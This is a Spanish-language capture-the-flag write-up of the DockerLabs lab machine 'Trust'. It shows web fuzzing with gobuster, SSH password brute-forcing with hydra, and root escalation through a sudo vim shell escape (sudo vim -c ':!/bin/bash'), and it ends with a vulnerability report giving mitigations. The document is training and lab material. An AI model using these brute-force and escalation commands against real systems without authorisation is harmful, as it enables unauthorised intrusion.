# Trust

> Un fichero oculto (secret.php) descubierto con gobuster filtra un usuario; con hydra saco su contraseña y escalo a root abusando de un permiso sudo sobre vim.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `Gobuster` · `Fuerza bruta SSH` · `Hydra` · `sudo` · `Vim` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
```

La web es la página por defecto de Apache, así que fuzzeo en busca de recursos ocultos.

## Enumeración web

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100
/index.html           (Status: 200)
/secret.php           (Status: 200)
/server-status        (Status: 403)
```

Aparece `secret.php`. Lo abro.

```bash
$ curl -s http://172.17.0.2/secret.php
Hola Mario,
Esta web no se puede hackear.
```

Me da un nombre de usuario: **mario**.

## Fuerza bruta del usuario mario

```bash
$ hydra -l mario -P rockyou.txt ssh://172.17.0.2 -t 64
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```

Entro por SSH con **mario : chocolate**.

```bash
$ ssh mario@172.17.0.2
mario@172.17.0.2's password: (chocolate)
mario@trust:~$ whoami
mario
```

## Escalada a root · sudo Vim

```bash
$ sudo -l
User mario may run the following commands on trust:
    (ALL) /usr/bin/vim
```

mario puede ejecutar `vim` como root. Según GTFOBins, desde el modo comando de Vim (`:!`) se puede lanzar una shell que hereda esos privilegios.

```bash
$ sudo vim -c ':!/bin/bash'
root@trust:/home/mario# whoami
root
```

Máquina Trust completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo sobre Vim

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** mario puede ejecutar vim como root; desde su modo comando (:!) se lanza una shell y se escala a root (GTFOBins).

**Mitigación.** Retirar vim de sudoers; si se necesita edición privilegiada, usar herramientas acotadas como sudoedit.

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta mario usa una contraseña de diccionario (chocolate), accesible por SSH mediante fuerza bruta.

**Mitigación.** Contraseñas robustas, bloqueo de intentos (fail2ban) y autenticación por clave.

### ⚪ BAJA — Fichero oculto que divulga un usuario válido

`CWE-200` · A05:2021 – Security Misconfiguration

**Impacto.** El endpoint no enlazado secret.php deja ver el nombre de un usuario válido (mario), que sirve de objetivo para la fuerza bruta.

**Mitigación.** No exponer información interna en ficheros accesibles; controlar el acceso a los recursos no públicos.

---

_Writeup de **Trust** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
